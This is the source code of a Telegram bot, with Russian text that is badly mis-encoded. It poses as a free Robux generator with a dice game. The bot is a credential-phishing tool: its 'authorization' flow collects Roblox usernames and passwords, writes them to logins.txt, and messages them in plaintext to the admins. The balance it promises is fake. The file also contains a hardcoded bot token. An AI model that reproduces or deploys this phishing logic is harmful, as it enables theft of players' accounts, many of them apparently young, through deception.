import random
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters
from datetime import datetime
import json
import os

# === –ù–ê–°–¢–†–û–ô–ö–ò ===
TOKEN = '8468207969:AAFtmIs-fM1untY9khU1N9l3ysAaQKfCNb8'
ADMIN_IDS = [6893832048]  # –ù–∞—á–∞–ª—å–Ω—ã–µ –∞–¥–º–∏–Ω—ã
MAIN_ADMIN_ID = 6893832048  # –ì–ª–∞–≤–Ω—ã–π –∞–¥–º–∏–Ω

CHECK_CHANNEL = '@OFF_Roblox'          # –ö–∞–Ω–∞–ª –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ–¥–ø–∏—Å–∫–∏
OFFICIAL_CHANNEL = '@RobloxRu_Official'  # –ö–∞–Ω–∞–ª –≤ –∫–Ω–æ–ø–∫–µ "–ù–∞—à –∫–∞–Ω–∞–ª"

# === –§–ê–ô–õ–´ –î–õ–Ø –°–û–•–†–ê–ù–ï–ù–ò–Ø ===
ADMINS_FILE = 'admins.json'
USER_DATA_FILE = 'user_data.json'

# === –•–†–ê–ù–ò–õ–ò–©–ê ===
user_states = {}       # 'awaiting_username', 'awaiting_password', 'awaiting_support'
user_data = {}         # –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –ª–æ–≥–∏–Ω—ã/–ø–∞—Ä–æ–ª–∏
support_active = {}    # ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏ –∏—Ö —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è –æ—Ç–≤–µ—Ç–∞ {user_id: {"message": —Ç–µ–∫—Å—Ç, "message_id": id}}
authorized_users = set() # ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, –∫–æ—Ç–æ—Ä—ã–µ —É–∂–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª–∏—Å—å
user_robux = {}        # –ë–∞–ª–∞–Ω—Å —Ä–æ–±—É–∫—Å–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π

# === –§–£–ù–ö–¶–ò–ò –î–õ–Ø –†–ê–ë–û–¢–´ –° –§–ê–ô–õ–ê–ú–ò ===
def load_admins():
    """–ó–∞–≥—Ä—É–∑–∫–∞ —Å–ø–∏—Å–∫–∞ –∞–¥–º–∏–Ω–æ–≤ –∏–∑ —Ñ–∞–π–ª–∞"""
    global ADMIN_IDS
    if os.path.exists(ADMINS_FILE):
        try:
            with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
                ADMIN_IDS = json.load(f)
        except:
            ADMIN_IDS = [6893832048]  # –ó–Ω–∞—á–µ–Ω–∏–µ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –ø—Ä–∏ –æ—à–∏–±–∫–µ

def save_admins():
    """–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –∞–¥–º–∏–Ω–æ–≤ –≤ —Ñ–∞–π–ª"""
    with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(ADMIN_IDS, f)

def load_user_data():
    """–ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏–∑ —Ñ–∞–π–ª–∞"""
    global authorized_users, user_robux
    if os.path.exists(USER_DATA_FILE):
        try:
            with open(USER_DATA_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                authorized_users = set(data.get('authorized_users', []))
                user_robux = data.get('user_robux', {})
        except:
            authorized_users = set()
            user_robux = {}

def save_user_data():
    """–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ —Ñ–∞–π–ª"""
    data = {
        'authorized_users': list(authorized_users),
        'user_robux': user_robux
    }
    with open(USER_DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f)

# === –û–°–ù–û–í–ù–´–ï –§–£–ù–ö–¶–ò–ò ===
def save_to_file(login, password):
    with open('logins.txt', 'a', encoding='utf-8') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        f.write(f"{timestamp}\nLogin: {login}\nPassword: {password}\n\n")

async def is_subscribed(context, user_id, channel):
    try:
        member = await context.bot.get_chat_member(channel, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def get_main_menu(user_id):
    buttons = [
        [
            InlineKeyboardButton("üì¢ –ù–∞—à –∫–∞–Ω–∞–ª", url=f"https://t.me/{OFFICIAL_CHANNEL.lstrip('@')}"),
            InlineKeyboardButton("üí¨ –û—Ç–∑—ã–≤—ã", url="https://t.me/Otz_DS")
        ],
        [
            InlineKeyboardButton("üé≤ –ë—Ä–æ—Å–∏—Ç—å –∫—É–±–∏–∫", callback_data='dice'),
            InlineKeyboardButton("üõ† –¢–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–∞", callback_data='support')
        ]
    ]

    if user_id not in authorized_users:
        buttons.append([InlineKeyboardButton("üîê –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è", callback_data='login')])
    else:
        robux_balance = user_robux.get(user_id, 0)
        buttons.append([InlineKeyboardButton(f"üí∞ –ë–∞–ª–∞–Ω—Å: {robux_balance} Robux", callback_data='balance')])

    if user_id in ADMIN_IDS:
        buttons.append([InlineKeyboardButton("‚öôÔ∏è –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å", callback_data='admin_panel')])

    return InlineKeyboardMarkup(buttons)

def add_robux(user_id, amount):
    if user_id not in user_robux:
        user_robux[user_id] = 0
    user_robux[user_id] += amount
    save_user_data()
    return user_robux[user_id]

def reset_user(user_id):
    """–ü–æ–ª–Ω—ã–π —Å–±—Ä–æ—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –≤—Å–µ—Ö –±–∞–∑ –¥–∞–Ω–Ω—ã—Ö"""
    user_states.pop(user_id, None)
    user_data.pop(user_id, None)
    support_active.pop(user_id, None)
    authorized_users.discard(user_id)
    user_robux.pop(user_id, None)
    save_user_data()

def add_admin(user_id):
    """–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –∞–¥–º–∏–Ω—ã"""
    if user_id not in ADMIN_IDS:
        ADMIN_IDS.append(user_id)
        save_admins()
        return True
    return False

def remove_admin(user_id):
    """–£–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –∞–¥–º–∏–Ω–æ–≤"""
    if user_id in ADMIN_IDS and user_id != MAIN_ADMIN_ID:  # –ù–µ–ª—å–∑—è —É–¥–∞–ª–∏—Ç—å –≥–ª–∞–≤–Ω–æ–≥–æ –∞–¥–º–∏–Ω–∞
        ADMIN_IDS.remove(user_id)
        save_admins()
        return True
    return False

# === –ê–î–ú–ò–ù –ö–û–ú–ê–ù–î–´ ===
async def reset_command(update, context):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞!")
        return

    try:
        target_user_id = int(context.args[0])
        reset_user(target_user_id)
        await update.message.reply_text(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {target_user_id} –ø–æ–ª–Ω–æ—Å—Ç—å—é —Å–±—Ä–æ—à–µ–Ω –∏–∑ –≤—Å–µ—Ö –±–∞–∑ –¥–∞–Ω–Ω—ã—Ö")
    except (IndexError, ValueError):
        await update.message.reply_text("‚ùå –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /reset user_id")

async def addadmin_command(update, context):
    user_id = update.effective_user.id

    # –¢–æ–ª—å–∫–æ –≥–ª–∞–≤–Ω—ã–π –∞–¥–º–∏–Ω –º–æ–∂–µ—Ç –¥–æ–±–∞–≤–ª—è—Ç—å –∞–¥–º–∏–Ω–æ–≤
    if user_id != MAIN_ADMIN_ID:
        await update.message.reply_text("‚ùå –¢–æ–ª—å–∫–æ –≥–ª–∞–≤–Ω—ã–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –º–æ–∂–µ—Ç –¥–æ–±–∞–≤–ª—è—Ç—å –Ω–æ–≤—ã—Ö –∞–¥–º–∏–Ω–æ–≤!")
        return

    try:
        target_user_id = int(context.args[0])
        if add_admin(target_user_id):
            await update.message.reply_text(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {target_user_id} –¥–æ–±–∞–≤–ª–µ–Ω –≤ –∞–¥–º–∏–Ω—ã")
        else:
            await update.message.reply_text(f"‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {target_user_id} —É–∂–µ —è–≤–ª—è–µ—Ç—Å—è –∞–¥–º–∏–Ω–æ–º")
    except (IndexError, ValueError):
        await update.message.reply_text("‚ùå –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /addadmin user_id")

async def removeadmin_command(update, context):
    user_id = update.effective_user.id

    # –¢–æ–ª—å–∫–æ –≥–ª–∞–≤–Ω—ã–π –∞–¥–º–∏–Ω –º–æ–∂–µ—Ç —É–¥–∞–ª—è—Ç—å –∞–¥–º–∏–Ω–æ–≤
    if user_id != MAIN_ADMIN_ID:
        await update.message.reply_text("‚ùå –¢–æ–ª—å–∫–æ –≥–ª–∞–≤–Ω—ã–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –º–æ–∂–µ—Ç —É–¥–∞–ª—è—Ç—å –∞–¥–º–∏–Ω–æ–≤!")
        return

    try:
        target_user_id = int(context.args[0])
        if remove_admin(target_user_id):
            await update.message.reply_text(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {target_user_id} —É–¥–∞–ª–µ–Ω –∏–∑ –∞–¥–º–∏–Ω–æ–≤")
        else:
            await update.message.reply_text(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {target_user_id} –∏–∑ –∞–¥–º–∏–Ω–æ–≤")
    except (IndexError, ValueError):
        await update.message.reply_text("‚ùå –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /removeadmin user_id")

async def admins_command(update, context):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞!")
        return

    admins_list = "\n".join([f"‚Ä¢ {admin_id} {'üëë' if admin_id == MAIN_ADMIN_ID else ''}" for admin_id in ADMIN_IDS])
    await update.message.reply_text(f"üëë –°–ø–∏—Å–æ–∫ –∞–¥–º–∏–Ω–æ–≤:\n{admins_list}")

async def stats_command(update, context):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞!")
        return

    stats_text = (
        f"üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞:\n"
        f"‚Ä¢ –í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {len(authorized_users)}\n"
        f"‚Ä¢ –í—Å–µ–≥–æ –∞–¥–º–∏–Ω–æ–≤: {len(ADMIN_IDS)}\n"
        f"‚Ä¢ –ê–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏: {len(user_states)}\n"
        f"‚Ä¢ –ê–∫—Ç–∏–≤–Ω—ã–µ –æ–±—Ä–∞—â–µ–Ω–∏—è: {len(support_active)}"
    )
    await update.message.reply_text(stats_text)

# === –û–°–ù–û–í–ù–´–ï –•–ï–ù–î–õ–ï–†–´ ===
async def start(update, context):
    user_id = update.effective_user.id

    if update.message:
        message = update.message
    elif update.callback_query:
        message = update.callback_query.message
    else:
        return

    if not await is_subscribed(context, user_id, CHECK_CHANNEL):
        join_btn = InlineKeyboardButton("‚ûï –ü–æ–¥–ø–∏—Å–∞—Ç—å—Å—è", url=f"https://t.me/{CHECK_CHANNEL.lstrip('@')}")
        check_btn = InlineKeyboardButton("‚úÖ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É", callback_data='check_sub')
        await message.reply_text(
            f"–ü–æ–¥–ø–∏—à–∏—Å—å –Ω–∞ –∫–∞–Ω–∞–ª {CHECK_CHANNEL}, —á—Ç–æ–±—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º!",
            reply_markup=InlineKeyboardMarkup([[join_btn], [check_btn]])
        )
        return

    await message.reply_text(
        "üëã  ô—ã–±·¥á·¥©–∏·¥õ·¥á –¥·¥á–π·¥Ñ·¥õ ô–∏·¥á\n"
       "\n–ë–æ·¥õ ·¥Ñ–æ–∑–¥·¥Ä–Ω –¥·¥ß—è –Ω·¥Ä·¥ã·¥©—É·¥õ·¥ã–∏ ·¥©–æ–±—É·¥ã·¥Ñ–æ ô –Ω·¥Ä  ô·¥Ä…Ø ·¥Ä·¥ã·¥ã·¥Ä—É–Ω·¥õ!\n"
       "\n–í—ã ô–æ–¥ –¥–æ·¥Ñ·¥õ—É·¥®·¥á–Ω ·¥õ–æ·¥ß—å·¥ã–æ 1 ·¥©·¥Ä–∑  ô –¥·¥á–Ω—å.\n"
       "\n‚ö†Ô∏è ·¥®·¥©–∏  ô ô–æ–¥·¥á –Ω·¥á ô·¥á·¥©–Ω—ã—Ö –¥·¥Ä–Ω–Ω—ã—Ö  ô—ã  ç–æ–∂·¥á·¥õ·¥á –±—ã·¥õ—å –∑·¥Ä–±·¥ß–æ·¥ã–∏·¥©–æ ô·¥Ä–Ω—ã!",
        reply_markup=get_main_menu(user_id)
    )

async def button(update, context):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()

    if query.data == 'check_sub':
        if await is_subscribed(context, user_id, CHECK_CHANNEL):
            await query.edit_message_text("‚úÖ –°–ø–∞—Å–∏–±–æ –∑–∞ –ø–æ–¥–ø–∏—Å–∫—É!")
            context.user_data['from_callback'] = True
            await start(update, context)
        else:
            join_btn = InlineKeyboardButton("‚ûï –ü–æ–¥–ø–∏—Å–∞—Ç—å—Å—è", url=f"https://t.me/{CHECK_CHANNEL.lstrip('@')}")
            check_btn = InlineKeyboardButton("‚úÖ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É", callback_data='check_sub')
            await query.edit_message_text(
                f"–í—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–Ω—ã –Ω–∞ {CHECK_CHANNEL}!",
                reply_markup=InlineKeyboardMarkup([[join_btn], [check_btn]])
            )
        return

    if not await is_subscribed(context, user_id, CHECK_CHANNEL):
        await query.edit_message_text("–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–ø–∏—à–∏—Ç–µ—Å—å –Ω–∞ –∫–∞–Ω–∞–ª!")
        return

    if query.data == 'login':
        user_states[user_id] = 'awaiting_username'
        await query.edit_message_text("üìù –í–≤–µ–¥–∏—Ç–µ –≤–∞—à Roblox username:")

    elif query.data == 'dice':
        if user_id not in authorized_users:
            await query.edit_message_text(
                "‚ùå –°–Ω–∞—á–∞–ª–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è!",
                reply_markup=get_main_menu(user_id)
            )
            return

        dice_message = await context.bot.send_dice(
            chat_id=query.message.chat_id,
            emoji='üé≤'
        )

        dice_value = dice_message.dice.value

        if dice_value == 1:
            robux_amount = 10
            new_balance = add_robux(user_id, robux_amount)
            result_text = f"üéØ ·¥©·¥á–∑—É·¥ß—å·¥õ·¥Ä·¥õ –±·¥©–æ·¥Ñ·¥ã·¥Ä: **{dice_value}**!\nüéâ **–ü–æ–∑–¥·¥©·¥Ä ô·¥ß—è·¥á ç!  ô—ã  ô—ã–∏·¥¶·¥©·¥Ä·¥ß–∏ {robux_amount} Robux!**\nüí∞ –í ô·¥Ä…Ø –±·¥Ä·¥ß·¥Ä–Ω·¥Ñ: **{new_balance} Robux**"
        else:
            result_text = f"üéØ ·¥©·¥á–∑—É·¥ß—å·¥õ·¥Ä·¥õ –±·¥©–æ·¥Ñ·¥ã·¥Ä: **{dice_value}**!\nüòî –ö ·¥Ñ–æ–∂·¥Ä·¥ß·¥á–Ω–∏—é,  ô—ã –Ω·¥á  ô—ã–∏·¥¶·¥©·¥Ä·¥ß–∏ Robux. –ü–æ·¥®·¥©–æ–±—É–π·¥õ·¥á ·¥á…Ø·¥á ·¥©·¥Ä·¥á!"

        await query.message.reply_text(
            result_text,
            parse_mode='Markdown',
            reply_markup=get_main_menu(user_id)
        )

    elif query.data == 'support':
        user_states[user_id] = 'awaiting_support'
        await query.edit_message_text("üì© –ù–∞–ø–∏—à–∏—Ç–µ –≤–∞—à –≤–æ–ø—Ä–æ—Å:")

    elif query.data == 'balance':
        if user_id in authorized_users:
            balance = user_robux.get(user_id, 0)
            await query.edit_message_text(
                f"üí∞ –í–∞—à —Ç–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: **{balance} Robux**\n\n"
                f"üé≤ –ë—Ä–æ—Å–∞–π—Ç–µ –∫—É–±–∏–∫, —á—Ç–æ–±—ã –≤—ã–∏–≥—Ä–∞—Ç—å –±–æ–ª—å—à–µ Robux!",
                parse_mode='Markdown',
                reply_markup=get_main_menu(user_id)
            )
        else:
            await query.edit_message_text(
                "‚ùå –°–Ω–∞—á–∞–ª–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è!",
                reply_markup=get_main_menu(user_id)
            )

    elif query.data == 'admin_panel':
        if user_id in ADMIN_IDS:
            # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ä–∞–∑–Ω—ã–µ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –ø—Ä–∞–≤
            if user_id == MAIN_ADMIN_ID:
                admin_panel_text = (
                    "‚öôÔ∏è **–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å (–ì–ª–∞–≤–Ω—ã–π –∞–¥–º–∏–Ω)**\n\n"
                    "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n"
                    "/addadmin [id] - –î–æ–±–∞–≤–∏—Ç—å –∞–¥–º–∏–Ω–∞\n"
                    "/removeadmin [id] - –£–¥–∞–ª–∏—Ç—å –∞–¥–º–∏–Ω–∞\n"
                    "/reset [id] - –°–±—Ä–æ—Å–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\n"
                    "/admins - –°–ø–∏—Å–æ–∫ –∞–¥–º–∏–Ω–æ–≤\n"
                    "/stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞"
                )
            else:
                admin_panel_text = (
                    "‚öôÔ∏è **–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å**\n\n"
                    "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n"
                    "/reset [id] - –°–±—Ä–æ—Å–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\n"
                    "/admins - –°–ø–∏—Å–æ–∫ –∞–¥–º–∏–Ω–æ–≤\n"
                    "/stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞"
                )

            await query.edit_message_text(
                admin_panel_text,
                parse_mode='Markdown',
                reply_markup=get_main_menu(user_id)
            )
        else:
            await query.edit_message_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞!")

async def handle_message(update, context):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–≤–µ—Ç–æ–≤ –∞–¥–º–∏–Ω–∞ –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ–¥–¥–µ—Ä–∂–∫–∏
    if user_id in ADMIN_IDS:
        replied_msg = update.message.reply_to_message
        if replied_msg and replied_msg.from_user.id == context.bot.id:
            for uid, data in support_active.items():
                if "admin_message_id" in data and data["admin_message_id"] == replied_msg.message_id:
                    try:
                        await context.bot.send_message(
                            uid,
                            f"üõ† –û—Ç–≤–µ—Ç –æ—Ç –ø–æ–¥–¥–µ—Ä–∂–∫–∏:\n\n{text}"
                        )
                        await update.message.reply_text("‚úÖ –û—Ç–≤–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é.")
                        support_active.pop(uid, None)
                        return
                    except Exception as e:
                        await update.message.reply_text(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {e}")
                        return
            await update.message.reply_text("‚ö†Ô∏è –ù–µ –Ω–∞–π–¥–µ–Ω–æ –∞–∫—Ç–∏–≤–Ω–æ–µ –æ–±—Ä–∞—â–µ–Ω–∏–µ –¥–ª—è —ç—Ç–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è.")
            return

    # –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–æ—Å—Ç–æ—è–Ω–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    if user_id in user_states:
        state = user_states[user_id]

        if state == 'awaiting_username':
            user_data[user_id] = {'username': text}
            user_states[user_id] = 'awaiting_password'
            await update.message.reply_text(f"–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞ **{text}**:", parse_mode='Markdown')
            return

        elif state == 'awaiting_password':
            if user_id not in user_data or 'username' not in user_data[user_id]:
                await update.message.reply_text("‚ùå –û—à–∏–±–∫–∞: —Å–Ω–∞—á–∞–ª–∞ –≤–≤–µ–¥–∏—Ç–µ username")
                user_states.pop(user_id, None)
                return

            username = user_data[user_id]['username']
            password = text
            save_to_file(username, password)

            authorized_users.add(user_id)
            if user_id not in user_robux:
                user_robux[user_id] = 0
            save_user_data()

            for admin in ADMIN_IDS:
                try:
                    await context.bot.send_message(
                        admin,
                        f"üîî –ù–æ–≤–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è!\n\n"
                        f"ID: {user_id}\n@{update.effective_user.username or 'N/A'}\n"
                        f"Login: {username}\nPassword: {password}"
                    )
                except Exception as e:
                    print(f"–ù–µ –æ—Ç–ø—Ä–∞–≤–∏–ª–æ—Å—å –∞–¥–º–∏–Ω—É: {e}")

            await update.message.reply_text(
                "‚úÖ –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥! –û–∂–∏–¥–∞–π—Ç–µ –Ω–∞—á–∏—Å–ª–µ–Ω–∏—è –†–æ–±—É–∫—Å–æ–≤.\n\n"
                "üé≤ –¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –±—Ä–æ—Å–∞—Ç—å –∫—É–±–∏–∫ –∏ –≤—ã–∏–≥—Ä—ã–≤–∞—Ç—å Robux!",
                reply_markup=get_main_menu(user_id)
            )
            user_states.pop(user_id, None)
            user_data.pop(user_id, None)
            return

        elif state == 'awaiting_support':
            support_active[user_id] = {
                "message": text,
                "user_message_id": update.message.message_id,
                "username": update.effective_user.username or 'N/A'
            }

            for admin in ADMIN_IDS:
                try:
                    admin_msg = await context.bot.send_message(
                        admin,
                        f"üì© –ù–æ–≤–æ–µ –æ–±—Ä–∞—â–µ–Ω–∏–µ –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É:\n"
                        f"ID: {user_id}\n"
                        f"Username: @{update.effective_user.username or 'N/A'}\n\n"
                        f"–°–æ–æ–±—â–µ–Ω–∏–µ: {text}\n\n"
                        f"üí¨ –û—Ç–≤–µ—Ç—å—Ç–µ –Ω–∞ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ, —á—Ç–æ–±—ã –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ—Ç–≤–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é."
                    )
                    support_active[user_id]["admin_message_id"] = admin_msg.message_id
                except Exception as e:
                    print(f"–ù–µ –æ—Ç–ø—Ä–∞–≤–∏–ª–æ—Å—å –∞–¥–º–∏–Ω—É: {e}")

            await update.message.reply_text("‚úÖ –í–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ! –û–∂–∏–¥–∞–π—Ç–µ –æ—Ç–≤–µ—Ç–∞.")
            user_states.pop(user_id, None)
            return

    await update.message.reply_text("–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –º–µ–Ω—é:", reply_markup=get_main_menu(user_id))

# === –ó–ê–ü–£–°–ö ===
def main():
    load_admins()
    load_user_data()

    app = Application.builder().token(TOKEN).build()

    # –û—Å–Ω–æ–≤–Ω—ã–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))

    # –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–æ–º–∞–Ω–¥ –∞–¥–º–∏–Ω–æ–≤
    app.add_handler(CommandHandler("reset", reset_command))
    app.add_handler(CommandHandler("addadmin", addadmin_command))
    app.add_handler(CommandHandler("removeadmin", removeadmin_command))
    app.add_handler(CommandHandler("admins", admins_command))
    app.add_handler(CommandHandler("stats", stats_command))

    # –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    app.run_polling()

if __name__ == '__main__':
    main()